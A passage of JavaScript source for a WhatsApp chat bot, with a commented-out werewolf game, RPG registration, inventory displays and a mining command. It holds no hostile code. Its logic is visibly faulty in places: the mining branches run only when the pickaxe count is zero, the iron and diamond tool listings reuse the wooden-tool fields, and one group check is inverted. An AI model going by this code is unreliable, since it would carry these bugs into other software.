            )}. Dengan sihir yang kamu punya, kamu bisa mengetahui peran pemain pilihanmu.\n*LIST PLAYER*:\n${list1}\n\nKetik *.wwpc dreamy nomor* untuk melihat role player`;
                    
                        await HuBotZ.sendMessage(ww[chat].player[i].id, {
                        text: text,
                        mentions: player,
                    });
                }

                // [ Guardian ]
            } else if (ww[chat].player[i].role === "guardian") {
                if (ww[chat].player[i].isdead != true) {
                    let text = `Hai ${pushname(
              ww[chat].player[i].id
            )} Kamu terpilih untuk memerankan *Malaikat Pelindung* ${emoji_role(
              "guardian"
            )}, dengan kekuatan yang kamu miliki, kamu bisa melindungi para warga, silahkan pilih salah 1 player yang ingin kamu lindungi\n*LIST PLAYER*:\n${list1}\n\nKetik *.wwpc deff nomor* untuk melindungi player`;
                    
                    await HuBotZ.sendMessage(ww[chat].player[i].id, {
                        text: text,
                        mentions: player,
                    });
                }

                // [ Sorcerer ]
            } else if (ww[chat].player[i].role === "sorcerer") {
                if (ww[chat].player[i].isdead != true) {
                    let text = `Hai ${pushname(
              ww[chat].player[i].id
            )} Kamu terpilih sebagai Penyihir ${emoji_role(
              "sorcerer"
            )}, dengan kekuasaan yang kamu punya, kamu bisa membuka identitas para player, silakan pilih 1 orang yang ingin kamu buka identitasnya\n*LIST PLAYER*:\n${list2}\n\nKetik *.wwpc sorcerer nomor* untuk melihat role player`;
                    
                    await HuBotZ.sendMessage(ww[chat].player[i].id, {
                        text: text,
                        mentions: player,
                    });
                }
            }
        }
        await HuBotZ.sendMessage(m.chat, {
            text: "*⌂ W E R E W O L F - G A M E*\n\nGame telah dimulai, para player akan memerankan perannya masing masing, silahkan cek chat pribadi untuk melihat role kalian. Berhati-hatilah para warga, mungkin malam ini adalah malah terakhir untukmu",
            contextInfo: {
                externalAdReply: {
                    title: "W E R E W O L F",
                    mediaType: 1,
                    renderLargerThumbnail: true,
                    thumbnail: await resize(thumb, 300, 175),
                    sourceUrl: "",
                    mediaUrl: '',
                },
                mentionedJid: player,
            },
        });
        await run(HuBotZ, chat, ww);
    } else if (value === "vote") {
        if (!ww[chat]) return m.reply("Belum ada sesi permainan");
        if (ww[chat].status === false)
            return m.reply("Sesi permainan belum dimulai");
        if (ww[chat].time !== "voting")
            return m.reply("Sesi voting belum dimulai");
        if (playerOnRoom(m.sender, chat, ww) === false)
            return m.reply("Kamu bukan player");
        if (dataPlayer(m.sender, ww).isdead === true)
            return m.reply("Kamu sudah mati");
        if (!target || target.length < 1)
            return m.reply("Masukan nomor player");
        if (isNaN(target)) return m.reply("Gunakan hanya nomor");
        if (dataPlayer(m.sender, ww).isvote === true)
            return m.reply("Kamu sudah melakukan voting");
        b = getPlayerById(chat, m.sender, parseInt(target), ww);
        if (b.db.isdead === true)
            return m.reply(`Player ${target} sudah mati.`);
        if (ww[chat].player.length < parseInt(target))
            return m.reply("Invalid");
        if (getPlayerById(chat, m.sender, parseInt(target), ww) === false)
            return m.reply("Player tidak terdaftar!");
        vote(chat, parseInt(target), m.sender, ww);
        return m.reply("✅ Vote");
    } else if (value == "exit") {
        if (!ww[chat]) return m.reply("Tidak ada sesi permainan");
        if (playerOnRoom(m.sender, chat, ww) === false)
            return m.reply("Kamu tidak dalam sesi permainan");
        if (ww[chat].status === true)
            return m.reply("Permainan sudah dimulai, kamu tidak bisa keluar");
        m.reply(`@${m.sender.split("@")[0]} Keluar dari permainan`, {
            withTag: true,
        });
        playerExit(chat, m.sender, ww);
    } else if (value === "delete") {
        if (!ww[chat]) return m.reply("Tidak ada sesi permainan");
        if (ww[chat].owner !== m.sender)
            return m.reply(
                `Hanya @${
            ww[chat].owner.split("@")[0]
          } yang dapat menghapus sesi permainan ini`
            );
        m.reply("Sesi permainan berhasil dihapus").then(() => {
            delete ww[chat];
        });
    } else if (value === "player") {
        if (!ww[chat]) return m.reply("Tidak ada sesi permainan");
        if (playerOnRoom(m.sender, chat, ww) === false)
            return m.reply("Kamu tidak dalam sesi permainan");
        if (ww[chat].player.length === 0)
            return m.reply("Sesi permainan belum memiliki player");
        let player = [];
        let text = "\n*⌂ W E R E W O L F - G A M E*\n\nLIST PLAYER:\n";
        for (let i = 0; i < ww[chat].player.length; i++) {
            text += `(${ww[chat].player[i].number}) @${ww[chat].player[i].id.replace(
          "@s.whatsapp.net",
          ""
        )} ${
          ww[chat].player[i].isdead === true
            ? `☠️ ${ww[chat].player[i].role}`
            : ""
        }\n`;
            player.push(ww[chat].player[i].id);
        }
        HuBotZ.sendMessage(
            m.chat, {
                text: text,
                contextInfo: {
                    externalAdReply: {
                        title: "W E R E W O L F",
                        mediaType: 1,
                        renderLargerThumbnail: true,
                        thumbnail: await resize(thumb, 300, 175),
                        sourceUrl: "",
                        mediaUrl: thumb,
                    },
                    mentionedJid: player,
                },
            }, {
                quoted: m
            }
        );
    } else {
        let text = `\n*⌂ W E R E W O L F - G A M E*\n\nPermainan Sosial Yang Berlangsung Dalam Beberapa Putaran/ronde. Para Pemain Dituntut Untuk Mencari Seorang Penjahat Yang Ada Dipermainan. Para Pemain Diberi Waktu, Peran, Serta Kemampuannya Masing-masing Untuk Bermain Permainan Ini\n\n*⌂ C O M M A N D*\n`;
        text += ` • ww create\n`;
        text += ` • ww join\n`;
        text += ` • ww start\n`;
        text += ` • ww exit\n`;
        text += ` • ww delete\n`;
        text += ` • ww player\n`;
        text += `\nPermainan ini dapat dimainkan oleh 5 sampai 15 orang.`;
        HuBotZ.sendMessage(
            m.chat, {
                text: text.trim(),
                contextInfo: {
                    externalAdReply: {
                        title: "W E R E W O L F",
                        mediaType: 1,
                        renderLargerThumbnail: true,
                        thumbnail: await resize(thumb, 300, 175),
                        sourceUrl: "",
                        mediaUrl: thumb,
                    },
                },
            }, {
                quoted: m
            }
        );
    }
}
}
break*/
/*case 'wwpc': {
if (!m.isGroup) return reply('Fitur Khusus Private Chat!')
const {
    emoji_role,
    sesi: getSesi,
    playerOnGame,
    playerOnRoom,
    playerExit,
    dataPlayer,
    dataPlayerById,
    getPlayerById,
    getPlayerById2,
    killWerewolf,
    killww,
    dreamySeer,
    sorcerer,
    protectGuardian,
    roleShuffle,
    roleChanger,
    roleAmount,
    roleGenerator,
    addTimer,
    startGame,
    playerHidup,
    playerMati,
    vote,
    voteResult,
    clearAllVote,
    getWinner,
    win,
    pagi,
    malam,
    skill,
    voteStart,
    voteDone,
    voting,
    run,
    run_vote,
    run_malam,
    run_pagi
} = require("./lib/werewolf");
    const {
        sender,
        chat
    } = m;
    this.werewolf = this.werewolf ? this.werewolf : {};
    const ww = this.werewolf ? this.werewolf : {};
    const value = args[0];
    const target = args[1];

    if (playerOnGame(sender, ww) === false)
        return m.reply("Kamu tidak dalam sesi game");
    if (dataPlayer(sender, ww).status === true)
        return m.reply(
            "Skill telah digunakan, skill hanya bisa digunakan sekali setiap malam"
        );
    if (dataPlayer(sender, ww).isdead === true)
        return m.reply("Kamu sudah mati");
    if (!target || target.length < 1) return m.reply("Masukan nomor player");
    if (isNaN(target)) return m.reply("Gunakan hanya nomor");
    let byId = getPlayerById2(sender, parseInt(target), ww);
    if (byId.db.isdead === true) return m.reply("Player sudah mati");
    if (byId.db.id === sender)
        return m.reply("Tidak bisa menggunakan skill untuk diri sendiri");
    if (byId === false) return m.reply("Player tidak terdaftar");
    if (value === "kill") {
        if (dataPlayer(sender, ww).role !== "werewolf")
            return m.reply("Peran ini bukan untuk kamu");
        if (byId.db.role === "sorcerer")
            return m.reply("Tidak bisa menggunakan skill untuk teman");
        return m
            .reply("Berhasil membunuh player " + parseInt(target))
            .then(() => {
                dataPlayer(sender, ww).status = true;
                killWerewolf(sender, parseInt(target), ww);
            });
    } else if (value === "dreamy") {
        if (dataPlayer(sender, ww).role !== "seer")
            return m.reply("Peran ini bukan untuk kamu");
        let dreamy = dreamySeer(m.sender, parseInt(target), ww);
        return m
            .reply(`Berhasil membuka identitas player ${target} adalah ${dreamy}`)
            .then(() => {
                dataPlayer(sender, ww).status = true;
            });
    } else if (value === "deff") {
        if (dataPlayer(sender, ww).role !== "guardian")
            return m.reply("Peran ini bukan untuk kamu");
        return m.reply(`Berhasil melindungi player ${target}`).then(() => {
            protectGuardian(m.sender, parseInt(target), ww);
            dataPlayer(sender, ww).status = true;
        });
    } else if (value === "sorcerer") {
        if (dataPlayer(sender, ww).role !== "sorcerer")
            return m.reply("Peran ini bukan untuk kamu");
        let sorker = sorcerer(getSesi(m.sender), target);
        return m.reply(`Berhasil membuka identitas player ${player} adalah ${sorker}`)
            .then(() => {
                dataPlayer(sender, ww).status = true;
            });
    }
}
break*/
//========== [ R P G || G A M E ] ==========\\
case 'reg':
case 'register':
case 'daftar': {
let user = db.data.users[m.sender];
    if (isRegistered) return reply('You are already registered');
    if (!q.includes('|')) return reply(`Incorrect Format!\nExample: ${prefix + command} Name|Age`);
    const namaUser = q.substring(0, q.indexOf('|') - 0);
    const umurUser = q.substring(q.lastIndexOf('|') + 1);
    const serialUser = createSerial(20);
    const Waktunya = new Date * 1;
    if (isNaN(umurUser)) return reply('Umur harus berupa angka!!');
    if (namaUser.length >= 30) return reply(`why is your name so long it's a name or a train`);
    if (umurUser > 50) return reply(`your age is too old maximum 50 years`);
    if (umurUser < 12) return reply(`your age is too young minimum 12 years`);

        // Verified
        const securityBuffer = await (await new canvafy.Security()
            .setAvatar(defaultpp)
            .setBackground("image", "https://cdn.discordapp.com/attachments/1087030211813593190/1110243947311288530/beeautiful-sunset-illustration-1212023.webp")
            .setCreatedTimestamp(Date.now())
            .setSuspectTimestamp(1)
            .setBorder("#f0f0f0")
            .setLocale("id") // country short code - default "en"
            .setAvatarBorder("#f0f0f0")
            .setOverlayOpacity(0.9)
            .build());

        // Msg
        let caption = `
*VERIFICATION SUCCESSFUL*

• *Name:* ${namaUser}
• *Age:* ${umurUser} tahun
• *Serial Number (SN):* ${serialUser}

Thank you for verifying. User data has been stored securely in the bot's database. Your data has now been verified.

🚀 Now you can use special features that are only available to verified users.
`;

await HuBotZ.sendMessage(m.chat, {
    image: securityBuffer,
    caption: caption
}, { quoted: m });
addRegisteredUser(m.sender, namaUser, umurUser, Waktunya, serialUser);
}
break;
case 'ceksn': {
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
  const UserSerial = checkSerialUser(m.sender);
    m.reply(`*📮 SN:* ${UserSerial}`);
  if (m.isGroup) return reply(`*📮 SN:* ${UserSerial}`)
}
break
case 'unreg': {
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
const _registered = JSON.parse(fs.readFileSync('./database/registered.json'))
const userSerialInput = args[0];    
    if (!userSerialInput) return m.reply('Serial Number kosong');
    const usernya = _registered.find(entry => entry.id === m.sender);
    if (usernya && userSerialInput === usernya.serial) {
        delRegisteredUser(userSerialInput);
        m.reply('```Succes Unreg !```');
    } else {
        m.reply('Serial Number salah atau tidak sesuai dengan akunmu.');
    }
}
break
case 'inv': 
case 'me': 
case 'inventori': 
case 'inventory': 
case 'profile': {
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
let user = db.data.users[m.sender];
let teks = `Example : *${prefix + command} 1*`
if (args[0] == '1') {
//basic inventory 
let teks1 = `
╭──────━• *INFO USER*
│ *👤 Name* : ${pushname}
│ *❤️ Blood* : ${user.health}
│ *✨ Level* : ${user.level}
│ *🏆 Role* : ${user.role}
│ *🌌 Limit* : ${isCreator ? 'Unlimited' : isPremium ? 'Unlimited' : user.limit}
│ *✉️ EXP* : ${user.exp}
│ *💹 Balance*: Rp.${user.money}
│ *🧪 Potion* : ${user.potion}\n
╰──────────━⃝┅⃝━━────────┄ 
${readMore}`
await HuBotZ.sendMessage(m.chat, {
text: teks1,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
renderLargerThumbnail: true,
title: `Basic Inventory`,
body: '',
thumbnailUrl: `https://telegra.ph/file/eb026b67d45e17632a131.jpg`,
sourceUrl: global.wagc,
mediaType: 1,
}}}, { quoted: fkontak})
} else if (args[0] == '2') {
//armor invetory
let teks2 = `
╭──────━• *USER LEATHER ARMOR*
│ *Helmet* : ${user.leatherhelmet}
│ *└─> Helmet Durability* : ${user.leatherhelmetdurability}
│ *Chestplate Durability* : ${user.leatherchestplate}
│ *└─> Chestplate Durability* : ${user.leatherchestplatedurability}
│ *Leggings Durability* : ${user.leatherleggings}
│ *└─> Leggings Durability* : ${user.leatherleggingsdurability}
│ *Boots Durability* : ${user.leatherboots}
│ *└─> Boots Durability* : ${user.leatherbootsdurability}
╰──────────━⃝┅⃝━━────────┄ 
${readMore}
╭──────━• *USER CHAINMAIL ARMOR*
│ *Helmet* : ${user.chainmailhelmet}
│ *└─> Helmet Durability* : ${user.chainmailhelmetdurability}
│ *Chestplate Durability* : ${user.chainmailchestplate}
│ *└─> Chestplate Durability* : ${user.chainmailchestplatedurability}
│ *Leggings Durability* : ${user.chainmailleggings}
│ *└─> Leggings Durability* : ${user.chainmailleggingsdurability}
│ *Boots Durability* : ${user.chainmailboots}
│ *└─> Boots Durability* : ${user.chainmailbootsdurability}
╰──────────━⃝┅⃝━━────────┄ 
${readMore}
╭──────━• *USER IRON ARMOR*
│ *Helmet* : ${user.ironhelmet}
│ *└─> Helmet Durability* : ${user.ironhelmetdurability}
│ *Chestplate Durability* : ${user.ironchestplate}
│ *└─> Chestplate Durability* : ${user.ironchestplatedurability}
│ *Leggings Durability* : ${user.ironleggings}
│ *└─> Leggings Durability* : ${user.ironleggingsdurability}
│ *Boots Durability* : ${user.ironboots}
│ *└─> Boots Durability* : ${user.ironbootsdurability}
╰──────────━⃝┅⃝━━────────┄ 
${readMore}
╭──────━• *USER GOLD ARMOR*
│ *Helmet* : ${user.goldhelmet}
│ *└─> Helmet Durability* : ${user.goldhelmetdurability}
│ *Chestplate Durability* : ${user.goldchestplate}
│ *└─> Chestplate Durability* : ${user.goldchestplatedurability}
│ *Leggings Durability* : ${user.goldleggings}
│ *└─> Leggings Durability* : ${user.goldleggingsdurability}
│ *Boots Durability* : ${user.goldboots}
│ *└─> Boots Durability* : ${user.goldbootsdurability}
╰──────────━⃝┅⃝━━────────┄ 
${readMore}
╭──────━• *USER DIAMOND ARMOR*
│ *Helmet* : ${user.diamondhelmet}
│ *└─> Helmet Durability* : ${user.diamondhelmetdurability}
│ *Chestplate Durability* : ${user.diamondchestplate}
│ *└─> Chestplate Durability* : ${user.diamondchestplatedurability}
│ *Leggings Durability* : ${user.diamondleggings}
│ *└─> Leggings Durability* : ${user.diamondleggingsdurability}
│ *Boots Durability* : ${user.diamondboots}
│ *└─> Boots Durability* : ${user.diamondbootsdurability}
╰──────────━⃝┅⃝━━────────┄ 
${readMore}`
await HuBotZ.sendMessage(m.chat, {
text: teks2,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
renderLargerThumbnail: true,
title: `Armor Inventory`,
body: '',
thumbnailUrl: `https://telegra.ph/file/eb026b67d45e17632a131.jpg`,
sourceUrl: global.wagc,
mediaType: 1,
}}}, { quoted: fkontak})
} else if (args[0] == '3') {
//tools inventory
let teks3 = `
╭──────━• *USER WODDEN TOOLS*
│ *Wooden Sword* : ${user.woodsword}
│ *└─>  Wooden Sword Durability* : ${user.woodsworddurability}
│ *Wooden Pickaxe* : ${user.woodpick}
│ *└─> Wooden Pickaxe Durability* : ${user.woodpickdurability}
│ *Wooden Axe* : ${user.woodaxe}
│ *└─> Wooden Axe Durability* : ${user.woodaxedurability}
│ * Wooden Shovel* : ${user.woodshovel}
│ *└─> Wooden Shovel Durability* : ${user.woodshoveldurability}
│ *Wooden Hoe* : ${user.woodhoe}
│ *└─> Wooden Hoe Durability* : ${user.woodhoedurability}
╰──────────━⃝┅⃝━━────────┄ 
${readMore}
╭──────━• *USER STONE TOOLS*
│ *Stone Sword* : ${user.stonesword}
│ *└─>  Stoneen Sword Durability* : ${user.stonesworddurability}
│ *Stone Pickaxe* : ${user.stonepick}
│ *└─> stoneen Pickaxe Durability* : ${user.stonepickdurability}
│ *Stone Axe* : ${user.stoneaxe}
│ *└─> stoneen Axe Durability* : ${user.stoneaxedurability}
│ * Stone Shovel* : ${user.stoneshovel}
│ *└─> Stone Shovel Durability* : ${user.stoneshoveldurability}
│ *Stone Hoe* : ${user.stonehoe}
│ *└─> Stone Hoe Durability* : ${user.stonehoedurability}
╰──────────━⃝┅⃝━━────────┄ 
${readMore}
╭──────━• *USER GOLD TOOLS*
│ *Wooden Sword* : ${user.woodsword}
│ *└─>  Wooden Sword Durability* : ${user.woodsworddurability}
│ *Wooden Pickaxe* : ${user.woodpick}
│ *└─> Wooden Pickaxe Durability* : ${user.woodpickdurability}
│ *Wooden Axe* : ${user.woodaxe}
│ *└─> Wooden Axe Durability* : ${user.woodaxedurability}
│ * Wooden Shovel* : ${user.woodshovel}
│ *└─> Wooden Shovel Durability* : ${user.woodshoveldurability}
│ *Wooden Hoe* : ${user.woodhoe}
│ *└─> Wooden Hoe Durability* : ${user.woodhoedurability}
╰──────────━⃝┅⃝━━────────┄ 
${readMore}
╭──────━• *USER IRON TOOLS*
│ *Iron Sword* : ${user.woodsword}
│ *└─>  Iron Sword Durability* : ${user.woodsworddurability}
│ *Iron Pickaxe* : ${user.woodpick}
│ *└─> Iron Pickaxe Durability* : ${user.woodpickdurability}
│ *Iron Axe* : ${user.woodaxe}
│ *└─> Iron Axe Durability* : ${user.woodaxedurability}
│ * Wooden Shovel* : ${user.woodshovel}
│ *└─> Iron Shovel Durability* : ${user.woodshoveldurability}
│ *Iron Hoe* : ${user.woodhoe}
│ *└─> Iron Hoe Durability* : ${user.woodhoedurability}
╰──────────━⃝┅⃝━━────────┄ 
${readMore}
╭──────━• *USER DIAMOND TOOLS*
│ *Diamond Sword* : ${user.woodsword}
│ *└─>  Diamond Sword Durability* : ${user.woodsworddurability}
│ *Diamond Pickaxe* : ${user.woodpick}
│ *└─> Diamond Pickaxe Durability* : ${user.woodpickdurability}
│ *Diamond Axe* : ${user.woodaxe}
│ *└─> Wooden Axe Durability* : ${user.woodaxedurability}
│ * Diamond Shovel* : ${user.woodshovel}
│ *└─> Diamond Shovel Durability* : ${user.woodshoveldurability}
│ *Diamond Hoe* : ${user.woodhoe}
│ *└─> Diamond
  Hoe Durability* : ${user.woodhoedurability}
╰──────────━⃝┅⃝━━────────┄ 
${readMore}
╭──────━• *USER OTHER TOOLS*
│ *Bow*: ${user.bow}
│ *└─> Bow Durability*: ${user.bowdurability}
│ *Fishingrod*: ${user.fishingrod}
│ *└─> Fishingrod Durability*: ${user.fishingroddurability}
╰──────────━⃝┅⃝━━────────┄ 
${readMore}`
await HuBotZ.sendMessage(m.chat, {
text: teks3,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
renderLargerThumbnail: true,
title: `Tools Inventory`,
body: '',
thumbnailUrl: `https://telegra.ph/file/eb026b67d45e17632a131.jpg`,
sourceUrl: global.wagc,
mediaType: 1,
}}}, { quoted: fkontak})
} else if (args[0] == '4') {
//material inventory
let teks4 = `
╭──────━• *HUNT RESULT*
│ *🐟 Fish* : ${user.ikan}
│ *🐔 Chicken* : ${user.ayam}
│ *🐇 Rabbit* : ${user.kelinci}
│ *🐑 Sheep* : ${user.domba}
│ *🐄 Cow* : ${user.sapi}
│ *🐘 Elephant* : ${user.gajah}
╰──────────━⃝┅⃝━━────────┄
${readMore}
╭──────━• *MATERIALS RESULT*
│ *🪵 Wood* : ${user.kayu}
│ *⏹️ Wood Planks* : ${user.planks}
│ *🦯 Stick* : ${user.stick}
╰──────────━⃝┅⃝━━────────┄
${readMore}
╭──────━• *MINING RESULT*
│ *🕳️ Coal* : ${user.coal}
│ *⛓️️ Iron* : ${user.iron}
│ *🌟 Gold* : ${user.gold}
│ *🐲 Emerald* : ${user.emerald}
│ *💎 Diamond* : ${user.diamond}
│ *🪨 Stone* : ${user.stone}
╰──────────━⃝┅⃝━━────────┄
${readMore}
╭──────━• *TRASH RESULT*
│ *🔩 Steel* : ${user.steel}
╰──────────━⃝┅⃝━━────────┄ 
${readMore}`
await HuBotZ.sendMessage(m.chat, {
text: teks4,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
renderLargerThumbnail: true,
title: `Material Inventory`,
body: '',
thumbnailUrl: `https://telegra.ph/file/eb026b67d45e17632a131.jpg`,
sourceUrl: global.wagc,
mediaType: 1,
}}}, { quoted: fkontak})
} else {
reply(teks)
}
}
break
case 'mining': 
case 'mine': {
if (!m.isGroup) return reply('Fitur Khusus Group!')
let user = db.data.users[m.sender]
let inpo = `
Mau Mining Pake Pickaxe Apa *${pushname}*?

Example : ${prefix + command} wood_pickaxe`
let cooldown = 300000;
let timers = cooldown - (new Date() - user.lastmining);
if (user.health < 60) return reply(`⚠️ Butuh setidaknya 60 ❤️Healths untuk menambang!! ⚠️\nKetik ${prefix}heal untuk regenerasi darah`)
if (new Date() - user.lastmining <= cooldown) {
return m.reply(`
⏳ Kamu sudah menambang sebelumnya! Silakan tunggu *${(timers / 1000).toFixed(2)} detik* sebelum menambang lagi.
`);
}
const alatnya = (args[0] || '').toLowerCase()
	if (alatnya == 'beliung_kayu' || alatnya == 'wood_pickaxe') {
		if (user.woodpick == 0) {
            let { key } = await HuBotZ.sendMessage(m.chat, { text: `*${pushname}* Otw Mining Di Cave Menggunakan Wood Pickaxe` }, { quoted: m });
            await sleep(2000);
            const pesn = [
                `Karena *${pushname}* Hanya Menggunakan Wood Pickaxe. . .`
                ];
            for (let i = 0; i < pesn.length; i++) {
        await HuBotZ.sendMessage(m.chat, { text: pesn[i], edit: key });
    };
    await sleep(2000);
    HuBotZ.sendMessage(m.chat, { text: `*${pushname}* Hanya Bisa Mengambil Coal Dan Cobblestone`, edit: key});
    await sleep(2000);
    let a = Math.ceil(Math.random() * 10);
    let b = Math.ceil(Math.random() * 15);
    user.health -= 5
    user.coal += a
    user.cobblestone += b
    user.lastmining = new Date() * 1;
    user.woodpickdurability -= ranNumb(5, 15)
    if (user.woodpickdurability <= 0) {
    user.woodpickdurability = 0
    user.woodpick = 0
    }
    let caption = `*----- _HASIL MINING_ -----*\n\n*Coal* : ${a}\n\n*Cobblestone* : ${b}\n\n*Blood* : -5`
let gambarmining = `https://telegra.ph/file/d17479f0a56cc52826101.jpg`
HuBotZ.sendMessage(m.chat, { image: { url: gambarmining }, caption: `${caption}` }, { quoted: m})
		} else {
			m.reply(`Maaf *${pushname}* Kamu Tidak Memiliki ⛏️ Wood pickaxe`)
		}
	} else if (alatnya == 'beliung_batu' || alatnya == 'stone_pickaxe') {
		if (user.stonepick == 0) {
            let { key } = await HuBotZ.sendMessage(m.chat, { text: `*${pushname}* Otw Mining Di Cave Menggunakan Stone Pickaxe` }, { quoted: m });
            await sleep(2000);
            const pesn = [
                `Karena *${pushname}* Hanya Menggunakan Stone Pickaxe. . .`
                ];
            for (let i = 0; i < pesn.length; i++) {
        await HuBotZ.sendMessage(m.chat, { text: pesn[i], edit: key });
    };
    await sleep(2000);
    HuBotZ.sendMessage(m.chat, { text: `*${pushname}* Hanya Bisa Mengambil Coal, Iron Dan Cobblestone`, edit: key});
    await sleep(2000);
    let a = Math.ceil(Math.random() * 15);
    let b = Math.ceil(Math.random() * 20);
    let c = Math.ceil(Math.random() * 10);
    user.health -= 10
    user.coal += a
    user.cobblestone += b
    user.iron += c
    user.lastmining = new Date() * 1;
    user.stonepickdurability -= ranNumb(10, 25)
    if (user.stonepickdurability <= 0) {
    user.stonepickdurability = 0
    user.stonepick = 0
    }
    let caption = `*----- _HASIL MINING_ -----*\n\n*Coal* : ${a}\n\n*Cobblestone* : ${b}\n\n*Iron* : ${c}\n\n*Blood* : -10`
let gambarmining = `https://telegra.ph/file/d17479f0a56cc52826101.jpg`
HuBotZ.sendMessage(m.chat, { image: { url: gambarmining }, caption: `${caption}` }, { quoted: m})
		} else {
			m.reply(`Maaf *${pushname}* Kamu Tidak Memiliki ⛏️ Stone pickaxe`)
		}
	} else if (alatnya == 'beliung_emas' || alatnya == 'gold_pickaxe') {
		if (user.goldpick == 0) {
            let { key } = await HuBotZ.sendMessage(m.chat, { text: `*${pushname}* Otw Mining Di Cave Menggunakan Gold Pickaxe` }, { quoted: m });
            await sleep(2000);
            const pesn = [
                `Karena *${pushname}* Hanya Menggunakan Gold Pickaxe. . .`
                ];
            for (let i = 0; i < pesn.length; i++) {
        await HuBotZ.sendMessage(m.chat, { text: pesn[i], edit: key });
    };
    await sleep(2000);
    HuBotZ.sendMessage(m.chat, { text: `*${pushname}* Hanya Bisa Mengambil Coal Dan Cobblestone`, edit: key});
    await sleep(2000);
    let a = Math.ceil(Math.random() * 15);
    let b = Math.ceil(Math.random() * 20);
    user.health -= 10
    user.coal += a
    user.cobblestone += b
    user.lastmining = new Date() * 1;
    user.goldpickdurability -= ranNumb(10, 20)
    if (user.goldpickdurability <= 0) {
    user.goldpickdurability = 0
    user.goldpick = 0
    }
    let caption = `*----- _HASIL MINING_ -----*\n\n*Coal* : ${a}\n\n*Cobblestone* : ${b}\n\n*Blood* : -10`
let gambarmining = `https://telegra.ph/file/d17479f0a56cc52826101.jpg`
HuBotZ.sendMessage(m.chat, { image: { url: gambarmining }, caption: `${caption}` }, { quoted: m})
		} else {
			m.reply(`Maaf *${pushname}* Kamu Tidak Memiliki ⛏️ Gold pickaxe`)
		}
	} else if (alatnya == 'beliung_besi' || alatnya == 'iron_pickaxe') {
		if (user.ironpick == 0) {
            let { key } = await HuBotZ.sendMessage(m.chat, { text: `*${pushname}* Otw Mining Di Underground Abyss Menggunakan Iron Pickaxe` }, { quoted: m });
            await sleep(2000);
            const pesn = [
                `Kali Ini *${pushname}* Menggunakan Iron Pickaxe. . .`
                ];
            for (let i = 0; i < pesn.length; i++) {
        await HuBotZ.sendMessage(m.chat, { text: pesn[i], edit: key });
    };
    await sleep(2000);
    HuBotZ.sendMessage(m.chat, { text: `Sekarang *${pushname}* Bisa Mengambil Coal, Iron, Gold, Dan Cobblestone`, edit: key});
    await sleep(2000);
    let a = Math.ceil(Math.random() * 25);
    let b = Math.ceil(Math.random() * 20);
    let c = Math.ceil(Math.random() * 10);
    let d = Math.ceil(Math.random() * 20);
    let e = Math.ceil(Math.random() * 2);
    user.health -= 30
    user.coal += a
    user.iron += b
    user.gold += c
    user.cobblestone += d
    user.diamond += e
    user.lastmining = new Date() * 1;
    user.ironpickdurability -= ranNumb(40, 55)
    if (user.ironpickdurability <= 0) {
    user.ironpickdurability = 0
    user.ironpick = 0
    }
    let caption = `*----- _HASIL MINING_ -----*\n\n*Coal* : ${a}\n\n*Iron* : ${b}\n\n*Gold* : ${c}\n\n*Diamond* : ${e}\n\n*Cobblestone* : ${d}\n\n*Blood* : -30`
let gambarmining = `https://telegra.ph/file/d17479f0a56cc52826101.jpg`
HuBotZ.sendMessage(m.chat, { image: { url: gambarmining }, caption: `${caption}` }, { quoted: m})
		} else {
			m.reply(`Maaf *${pushname}* Kamu Tidak Memiliki ⛏️ Iron pickaxe`)
		}
	} else if (alatnya == 'beliung_berlian' || alatnya == 'diamond_pickaxe') {
		if (user.diamondpick == 0) {
            let { key } = await HuBotZ.sendMessage(m.chat, { text: `*${pushname}* Otw Mining Di Earth's Core Menggunakan Diamond Pickaxe` }, { quoted: m });
            await sleep(2000);
            const pesn = [
                `Kali Ini *${pushname}* Menggunakan Pickaxe Terbaik. . .`
                ];
            for (let i = 0; i < pesn.length; i++) {
        await HuBotZ.sendMessage(m.chat, { text: pesn[i], edit: key });
    };
    await sleep(2000);
    HuBotZ.sendMessage(m.chat, { text: `*${pushname}* Bisa Mengambil Coal, Iron, Gold, Diamond, Emerald Dan Cobblestone`, edit: key});
    await sleep(2000);
    let a = Math.ceil(Math.random() * 40);
    let b = Math.ceil(Math.random() * 30);
    let c = Math.ceil(Math.random() * 20);
    let d = Math.ceil(Math.random() * 60);
    let e = Math.ceil(Math.random() * 3);
    let f = Math.ceil(Math.random() * 2);
    user.health -= 30
    user.coal += a
    user.iron += b
    user.gold += c
    user.cobblestone += d
    user.diamond += e
    user.emerald += f
    user.lastmining = new Date() * 1;
    user.ironpickdurability -= ranNumb(40, 55)
    if (user.ironpickdurability <= 0) {
    user.ironpickdurability = 0
    user.ironpick = 0
    }
    let caption = `*----- _HASIL MINING_ -----*\n\n*Coal* : ${a}\n\n*Iron* : ${b}\n\n*Gold* : ${c}\n*Diamond* : ${e}\n\n*Emerald* : ${f}\n\n*Cobblestone* : ${d}\n\n*Blood* : -30`
let gambarmining = `https://telegra.ph/file/d17479f0a56cc52826101.jpg`
HuBotZ.sendMessage(m.chat, { image: { url: gambarmining }, caption: `${caption}` }, { quoted: m})
		} else {
			m.reply(`Maaf *${pushname}* Kamu Tidak Memiliki ⛏️ Diamond pickaxe`)
		}
    } else {
    m.reply(inpo)
    }
}
break
/*case 'sell': case 'sel': case 'jual':{
 if (!text) return newReply(`Mau jual apa?\n- ikan\n- ayam\n- kelinci\n- domba\n- sapi\n- gajah\n- besi\n- emas\n- emerald\n\nExample : ${prefix + command} ikan 2`)
var anu = args[1]
 if (args[0] === 'ikan'){
 if (isIkan < anu) return m.reply(`Anda Tidak Memiliki Cukup Ikan Untuk Transaksi Ini`)
 if (!args[1]) return m.reply(`Example : ${prefix + command} ikan 2\n 1 Ikan = 300 Money`)
let duit = 300 * anu
kurangIkan(m.sender, anu)
addBalance(m.sender, duit, balance)
reply(`Transaksi Berhasil ✅\n*Sisa uang* : $${getBalance(m.sender, balance)}\n*Sisa Ikan Fish : ${getIkan(m.sender)}`)
 } else
 if (args[0] === 'ayam'){
 if (isAyam < anu) return m.reply(`Anda Tidak Memiliki Cukup Ayam Untuk Transaksi Ini`)
 if (!args[1]) return m.reply(`Example : ${prefix + command} ayam 2\n 1 Ayam = 200 Money`)
let duit1 = 200 * anu
